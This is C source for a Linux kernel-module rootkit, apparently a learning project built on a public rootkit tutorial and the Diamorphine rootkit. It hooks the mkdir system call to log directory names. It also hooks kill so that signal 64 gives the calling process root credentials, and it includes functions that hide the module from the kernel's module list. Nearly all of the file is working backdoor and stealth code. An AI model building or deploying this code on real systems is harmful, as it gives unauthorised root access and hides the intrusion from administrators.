//https://xcellerator.github.io/posts/linux_rootkits_11/
//https://github.com/m0nad/Diamorphine
#include "ftrace_hook.h"

static struct list_head *prev_module;
static short hidden = 0;

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*og_mkdir)(const struct pt_regs *);

asmlinkage int cogito_mkdir(const struct pt_regs *regs)
{
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "rootkit: trying to create directory with name: %s\n", dir_name);

    og_mkdir(regs);
    return 0;
}
#else
static asmlinkage long (*og_mkdir)(const char __user *pathname, umode_t mode);

asmlinkage int cogito_mkdir(const char __user *pathname, umode_t mode)
{
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "rootkit: trying to create directory with name %s\n", dir_name);

    og_mkdir(pathname, mode);
    return 0;
}
#endif

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);

/* We can only modify our own privileges, and not that of another
 * process. Just have to wait for signal 64 (normally unused)
 * and then call the set_root() function. */
asmlinkage int hook_kill(const struct pt_regs *regs)
{
    void set_root(void);

    // pid_t pid = regs->di;
    int sig = regs->si;

    if ( sig == 64 )
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
        return 0;
    }

    return orig_kill(regs);

}
#else
/* This is the old way of declaring a syscall hook */
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

static asmlinkage int hook_kill(pid_t pid, int sig)
{
    void set_root(void);

    if ( sig == 64 )
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
        return 0;
    }

    return orig_kill(pid, sig);
}
#endif

/* Whatever calls this function will have it's creds struct replaced
 * with root's */
void set_root(void)
{
    /* prepare_creds returns the current credentials of the process */
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    /* Run through and set all the various *id's to 0 (root) */
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    /* Set the cred struct that we've modified to that of the calling process */
    commit_creds(root);
}


static struct ftrace_hook hooks[] = {
	HOOK("sys_mkdir",  cogito_mkdir,  &og_mkdir),
	HOOK("sys_kill", hook_kill, &orig_kill),
};

void showme(void)
{
    /* Add the saved list_head struct back to the module list */
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}

void hideme(void)
{
    /* Save the module in the list before us, so we can add ourselves
     * back to the list in the same place later. */
    prev_module = THIS_MODULE->list.prev;
    /* Remove ourselves from the list module list */
    list_del(&THIS_MODULE->list);
    hidden = 1;
}

static int __init rk_init(void){
	//hideme();
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "rootkit: Loaded >:-)\n");
    return 0;
}

static void __exit rk_cleanup(void){
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rk_init);
module_exit(rk_cleanup);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nerelod");
MODULE_DESCRIPTION("LKM rootkit");
